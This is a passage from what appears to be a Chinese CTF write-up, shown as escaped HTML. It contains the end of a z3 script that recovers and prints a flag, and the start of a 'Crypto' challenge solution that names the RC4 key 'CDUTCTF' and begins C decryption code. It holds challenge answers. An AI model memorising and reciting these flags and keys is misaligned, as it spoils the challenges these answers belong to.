&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v24&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;71&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v23&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;v24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# [v13 = 95,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v5 = 123,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v16 = 95,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v24 = 125,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v12 = 101,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v14 = 116,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v21 = 114,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v2 = 108,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v10 = 48,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v18 = 51,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v20 = 101,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v3 = 97,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v15 = 48,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v6 = 87,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v23 = 101,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v19 = 118,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v7 = 51,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v4 = 103,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v8 = 108,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v22 = 51,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v17 = 82,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v11 = 109,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v1 = 102,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#  v9 = 99]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;102&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;103&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;87&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;108&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;99&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;109&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;95&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;116&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;95&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;82&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;118&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;101&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;125&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;题目名称crypto&#34;&gt;题目名称:Crypto
&lt;/h2&gt;&lt;p&gt;出题人:&lt;strong&gt;Nameless&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;两种解法&lt;/p&gt;
&lt;p&gt;打开IDA,会发现key = &amp;ldquo;CDUTCTF&amp;rdquo;  ，从函数名可以分析出采用的是rc4加密&lt;/p&gt;
&lt;p&gt;解法1.已知密钥为CDUTCTF，直接用rc4进行计算即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;longULONG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;rc4_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
